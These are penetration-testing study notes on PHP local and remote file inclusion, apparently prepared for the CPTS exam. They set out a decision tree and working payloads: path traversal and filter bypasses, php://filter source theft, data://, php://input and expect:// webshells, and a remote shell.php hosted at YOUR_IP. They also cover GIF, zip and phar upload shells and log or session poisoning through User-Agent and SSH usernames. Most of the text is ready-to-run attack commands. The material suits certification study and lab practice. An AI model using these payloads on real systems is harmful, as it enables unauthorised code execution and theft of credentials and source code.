# File Inclusion (LFI/RFI) — Explained Simply (full CPTS coverage)

> Expanded version of my File Inclusion notes. Same content, nothing skipped, but with the **"when do I use which technique?"** decision logic added — the part that was missing. Commands single-line.

---

## The ONE idea

**File Inclusion = the app uses something YOU control as a file path.** A parameter like `?page=about.php` gets turned into `include("about.php")`. If you can change that path, you can:

1. **Read files you shouldn't** (LFI — Local File Inclusion), and sometimes
2. **Run code** (RCE), if the include function *executes* what it loads and you can get your code into a file it includes.

Everything below is either **"read a file"** or **"turn the read into code execution."**

---

## THE DECISION TREE (read this first — fixes "when do I use one?")

```
1. Do I even have file inclusion?

   → change the param to a known file (Linux: /etc/passwd | Windows: C:\windows\win.ini)
   
   → contents come back? = YES, you have LFI.

2. Figure out how the app builds the path (so your payload fits):

   → prefix?  include("lang_".$x)         → need /../ to escape
   → suffix?  include($x.".php")          → it appends .php (filters/tricks needed)
   → folder?  include("./pages/".$x)       → traverse out with ../../../

3. What do I WANT?

   ├─ Just READ files      → basic LFI + ../ traversal + php://filter (source code)
   └─ Want RCE             → depends ENTIRELY on the tech stack ↓

4. RCE path by stack:

   ┌─ PHP + allow_url_include=On      → data:// or php://input wrapper
   ├─ PHP + I can upload a file       → upload a shell (gif/zip/phar) → include it
   ├─ PHP + I control a log/session   → log poisoning (User-Agent / PHPSESSID)
   ├─ PHP + remote include allowed    → RFI (host shell.php, include via http/smb)
   └─ .NET / Java / Node              → NO php wrappers. LFI = file-read only.
                                         → read the stack's config → different attack
```

⚠️ THE BIG RULE (write this on your forehead): the LFI→RCE wrappers (data://, php://input, expect://, zip://, phar://, log poisoning) are PHP-ONLY. On .NET / Java / Node, file inclusion usually just reads files — then you read the stack's secret config and pivot to a stack-specific attack. (This is why POV — an ASP.NET box — ignored every PHP trick: the win was reading web.config → machineKey → ViewState RCE, a totally different chain.)

⚠️ SECOND BIG RULE: the prize file depends on the stack. Stop reflexively typing /etc/passwd.

| Stack | Read this file |
|---|---|
| PHP/Linux | /etc/passwd, config.php, wp-config.php, .env, ~/.ssh/id_rsa |
| ASP.NET/Windows | web.config (→ machineKey → ViewState RCE), C:\windows\win.ini |
| Java | web.xml, application.properties |
| Node | .env, config.js |

# Section 1 — LFI basics

**LFI** = the app includes a **local** file using your input. Example: `?language=es.php` → `include($_GET['language'])`.

### Do I have LFI? → read a known file

```
http://SERVER/index.php?language=/etc/passwd
```

Contents come back = **LFI confirmed**. If direct `/etc/passwd` fails, the app probably **adds a folder before your input** (`include("./languages/".$x)`) → use **path traversal**:

```
http://SERVER/index.php?language=../../../../etc/passwd
```

`../` = go up one directory. Unknown depth? Add extra `../` (harmless once you're at `/`).

### Understand how the path is built FIRST (this decides your payload)
| App code | What it does | Your fix |
|---|---|---|
| `include($x)` | uses input directly | plain `/etc/passwd` |
| `include("lang_".$x)` | **prefix** before input | `/../../etc/passwd` (break out of the prefix) |
| `include($x.".php")` | **appends `.php`** | needs a filter/trick (see bypasses) |
| `include("./pages/".$x)` | **folder** before input | `../../../../etc/passwd` |

### Second-order LFI

Malicious value is **stored first, used later** as a path. E.g. register username = `/etc/passwd`; later the app builds a file path from the username → LFI fires. Flow: **malicious input → stored → used later as a file path.**

# Section 2 — File Inclusion Functions (what's even possible)

**This table tells you upfront whether RCE is on the table.** "Execute = Yes" = LFI can become RCE; "Execute = No" = file-read only.

| Function | Read | Execute | Remote URL |
|---|---:|---:|---:|
| **PHP** | | | |
| `include()` / `include_once()` | Yes | **Yes** | **Yes** |
| `require()` / `require_once()` | Yes | **Yes** | No |
| `file_get_contents()` | Yes | No | Yes |
| `fopen()` / `file()` | Yes | No | No |
| **NodeJS** | | | |
| `fs.readFile()` | Yes | No | No |
| `fs.sendFile()` | Yes | No | No |
| `res.render()` | Yes | **Yes** | No |
| **Java** | | | |
| `include` | Yes | No | No |
| `import` | Yes | **Yes** | Yes |
| **.NET** | | | |
| `@Html.Partial()` | Yes | No | No |
| `@Html.RemotePartial()` | Yes | No | Yes |
| `Response.WriteFile()` | Yes | No | No |
| `include` | Yes | **Yes** | Yes |

> **How to use this table:** the "Execute = Yes" functions (`include`/`require` in PHP especially) are the ones where you can go from reading a file to **running code**. If the app uses a read-only function (`file_get_contents`, `fs.readFile`), you can only **read** — so focus on stealing secrets, not RCE.

# Section 3 — LFI payloads + filter bypasses

**Basic:**

| Payload | Use when |
|---|---|
| `?language=/etc/passwd` | no folder/prefix added |
| `?language=../../../../etc/passwd` | a folder is prepended |
| `?language=/../../../etc/passwd` | a filename prefix is added |
| `?language=./languages/../../../../etc/passwd` | app requires its own path to appear |

**Bypasses (when `../` is filtered):**

| Payload | Beats |
|---|---|
| `....//....//....//etc/passwd` | a filter that strips `../` **once** (leaves a valid `../`) |
| `%2e%2e%2f%2e%2e%2f...%65%74%63%2f%70%61%73%73%77%64` | filters that block literal `../` (URL-encode it) |
| `../../../etc/passwd/./././.[~2048×]` | append-extension bypass via path truncation *(obsolete)* |
| `../../../../etc/passwd%00` | null-byte to cut an appended extension *(obsolete, PHP<5.3)* |

> **Do I need a bypass?** Only if plain traversal is blank/filtered. Try plain first; if it's stripped → `....//`; if literal `../` is blocked → URL-encode. The `%00` and truncation tricks only work on **ancient PHP** — don't waste time on modern targets.

Build the 2048× string:

```bash
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```

# Section 4 — PHP Filters (read source code)

**When to use:** you have LFI on a **PHP** app and want to read a **PHP file's source** (configs, to find creds/DB passwords). Normally including a `.php` file **executes** it (you see output, not code). The base64 filter makes PHP hand you the **raw source** instead.

```
?language=php://filter/read=convert.base64-encode/resource=configure
```

- `resource=` = the file to read (try `config`, `db`, `configure`, `index` — fuzz for php files first).
- Decode the base64 output → read the source → hunt for passwords/keys.

> **Do I have this?** PHP app + LFI. It's **read-only** (no RCE by itself), but it's how you loot PHP source for secrets. First-move on any PHP LFI.

# Section 5 — LFI → RCE via PHP wrappers

**All of these need PHP.** They turn file-read into code execution.

| Wrapper | What it does | Requirement |
|---|---|---|
| `data://` | include PHP code straight from the URL | `allow_url_include = On` |
| `php://input` | include PHP code from the POST body | `allow_url_include = On` + POST |
| `expect://` | run a system command directly | `expect` extension enabled |

### First — check `allow_url_include` (it's OFF by default)

Read php.ini through the LFI (base64 filter, since it's big):

```bash
curl "http://SERVER/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```
```bash
echo '<BASE64>' | base64 -d | grep allow_url_include
```

`allow_url_include = On` → `data://` and `php://input` are usable.

### data:// wrapper

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```
```bash
curl -s 'http://SERVER/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

(`+` in a URL = space, so `ls+/` after `&cmd=` means `ls /`.)

### php://input wrapper (PHP code in POST body)

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://SERVER/index.php?language=php://input&cmd=id" | grep uid
```

If the app only takes POST, hardcode the command: `<?php system('id'); ?>`.

### expect:// wrapper (direct command execution)

Check it's enabled:

```bash
echo '<BASE64>' | base64 -d | grep expect
```

`extension=expect` present → test:

```bash
curl -s "http://SERVER/index.php?language=expect://id" | grep uid
```

> **When to reach for wrappers:** PHP + LFI + you want RCE + `allow_url_include=On` (for data/input) or `expect` enabled. If `allow_url_include=Off` and no expect → wrappers are out, go to **uploads** or **log poisoning**.

# Section 6 — RFI (Remote File Inclusion)

**When to use:** the include function allows **remote URLs** (`include`/`require` with `allow_url_include=On`, or a Windows box via SMB). You host your shell and make the app include it from **your** server.

- On **Windows** targets you **don't need `allow_url_include`** — use **SMB** (works best on the same network).

Host a shell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server 80
```

Include it remotely:

```
?language=http://YOUR_IP:80/shell.php&cmd=cat+/flag.txt
```

> **Do I have RFI?** The include function must allow remote URLs (see the functions table) AND `allow_url_include=On` (or Windows+SMB). Test: `?language=http://YOUR_IP/test` and watch your web server for a hit.

# Section 7 — LFI + File Uploads → RCE

**When to use:** `allow_url_include` is **Off** (so wrappers/RFI are dead) BUT the app lets you **upload a file** AND you have LFI to include it. You hide PHP in an uploaded file, then include it.

### Option 1 — image (GIF) upload

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
```
?language=./profile_images/shell.gif&cmd=id
```

(the `GIF8` magic bytes make it pass image checks; PHP still runs the code when included.)

### Option 2 — ZIP upload (`zip://`)

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

```bash
zip shell.jpg shell.php
```

```
?language=zip://shell.zip%23shell.php&cmd=id
```

### Option 3 — PHAR upload (`phar://`)

Create (`shell.php`):

```php
<?php $phar=new Phar('shell.phar'); $phar->startBuffering(); $phar->addFromString('shell.txt','<?php system($_GET["cmd"]); ?>'); $phar->setStub('<?php __HALT_COMPILER(); ?>'); $phar->stopBuffering(); ?>
```

```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
```
?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

> **Do I have this?** A file-upload feature + LFI + the included file runs through an **execute-capable** function (`include`/`require`). Pick GIF if it checks magic bytes, zip/phar if it checks extension. (There's also an obsolete LFI+phpinfo trick — rare, needs LFI+uploads+old PHP+exposed phpinfo(); skip unless desperate.)

# Section 8 — Log Poisoning (LFI → RCE, PHP)

**Idea:** put PHP code into a file the server writes (a log or session file), then **include that file** so the code runs.

**Requirements (all 3):** app is **PHP-LFI** + the PHP process can **read** the poisoned file + the include uses an **execute-capable** function (`include`/`require`).

## 1. PHP session poisoning

Sessions are stored server-side. Linux: `/var/lib/php/sessions/sess_<PHPSESSID>`. Windows: `C:\Windows\Temp\`.

**Step 1 — include your session file:**

```
?language=/var/lib/php/sessions/sess_<YOUR_PHPSESSID>
```

Check which values you control (e.g. a `page` value from the `language` param).

**Step 2 — confirm control:** set the value to `session_poisoning`, include the session file again, see if it appears.


**Step 3 — poison with PHP:**

```
?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

(that's `<?php system($_GET["cmd"]); ?>` URL-encoded)

**Step 4 — include + execute:**

```
?language=/var/lib/php/sessions/sess_<YOUR_PHPSESSID>&cmd=id
```

The session file gets overwritten after inclusion — re-poison before each new command.

## 2. Server log poisoning

Web servers log requests, including the **User-Agent** (which you control). Put PHP in the User-Agent → it lands in the log → include the log → it runs.

| Server | Linux log | Windows log |
|---|---|---|
| Apache | `/var/log/apache2/access.log` | `C:\xampp\apache\logs\` |
| Nginx | `/var/log/nginx/access.log` | `C:\nginx\log\` |

**Step 1 — can I read the log?**

```
?language=/var/log/apache2/access.log
```

(Apache logs are often root-only; Nginx logs are more often readable — **verify**, don't assume.)
**Step 2 — poison the User-Agent:**

```bash
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
```
```bash
curl -s "http://SERVER/index.php" -H @Poison
```

**Step 3 — include the poisoned log:**

```
?language=/var/log/apache2/access.log&cmd=id
```

The poisoning request doesn't run the code — it just **plants** it in the log. Any later request including the log runs it.

## 3. /proc as an alternative
| File | Use |
|---|---|
| `/proc/self/environ` | includes the process's env (User-Agent sometimes lands here) |
| `/proc/self/fd/N` | a process file descriptor |
(permissions vary — may not be readable.)

## 4. Other log targets

Anything that **logs input you control** + is **LFI-readable**: 

`/var/log/sshd.log` (SSH username), `/var/log/mail`, `/var/log/vsftpd.log` (FTP username). E.g. SSH with username `<?php system($_GET["cmd"]);?>` → poisons the SSH log → include it.

> **When to reach for log poisoning:** PHP-LFI, `allow_url_include=Off`, no upload feature → but you can write to a log/session the LFI can read. It's the fallback when wrappers/uploads aren't available.

# Section 9 — Automated scanning (find LFI + paths fast)

**When to use:** you suspect LFI but don't know the parameter, the webroot, or how many `../` you need. Fuzz it.

Find vulnerable parameters:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://SERVER/index.php?FUZZ=value' -fs <size>
```

Find the webroot path (so you know your traversal depth):

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://SERVER/index.php?language=../../../../FUZZ/index.php' -fs <size>
```

Fuzz LFI payloads / traversal (great wordlist):

```bash
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://SERVER/index.php?language=FUZZ' -fs <size>
```

Fuzz server config files to read:

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://SERVER/index.php?language=../../../../FUZZ' -fs <size>
```

**Wordlists:** `LFI-Jhaddix.txt` (payloads), `default-web-root-directory-linux/windows.txt` (webroots), DragonJAR `LFI-WordList-Linux/Windows` (config paths). Tools: LFISuite, LFiFreak, liffy (check if maintained).

> Remember `-fs <size>` = filter the "not found" response size (find it by running once unfiltered).

# The whole thing in one picture

```
Confirm LFI (read /etc/passwd or win.ini)
  → understand path building (prefix/suffix/folder) → craft traversal
  → READ secrets: php://filter (PHP source), stack config (web.config etc.)
  → want RCE?
       PHP + allow_url_include?  → data:// / php://input
       PHP + expect ext?          → expect://
       PHP + upload?              → gif/zip/phar → include
       PHP + writable log/session?→ log poisoning
       PHP + remote allowed?      → RFI
       NOT PHP (.NET/Java/Node)?  → file-read only → loot config → stack-specific attack
```

## Takeaways
1. **LFI = app uses your input as a file path.** First confirm by reading a known file.
2. **Understand how the path is built** (prefix/suffix/folder) before crafting payloads.
3. **Wrappers/uploads/log-poisoning/RFI are PHP-ONLY.** On .NET/Java/Node, LFI usually just reads files.
4. **The prize file depends on the stack** — not always `/etc/passwd` (ASP.NET → `web.config`).
5. **php://filter** = read PHP source for secrets (read-only, first move on PHP LFI).
6. **Pick the RCE path by what's available:** allow_url_include → wrappers; upload → gif/zip/phar; writable log → poisoning; remote → RFI.
7. **Fuzz** when you don't know the param/webroot/depth (ffuf + LFI-Jhaddix).
